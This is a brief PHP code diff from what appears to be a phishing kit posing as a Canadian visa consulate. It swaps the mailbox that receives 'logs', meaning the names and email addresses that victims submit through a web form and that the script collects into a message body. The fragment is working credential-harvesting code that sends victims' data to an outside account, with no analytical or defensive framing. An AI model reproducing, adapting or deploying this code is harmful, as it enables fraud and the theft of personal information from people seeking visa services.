@@ -73,7 +73,7 @@ function getUserBrowser() {
 if(isset($_POST['email']) && $_POST['fname'] != ''){
 
  // (box to receive logs)
-    $sendTo = "canadavisaconsulate@gmail.com";   
+    $sendTo = "gerardhaggett0@gmail.com";   
     $body = "";
 
     $body .= "First Name: " . $_POST['fname'] . "\r\n";
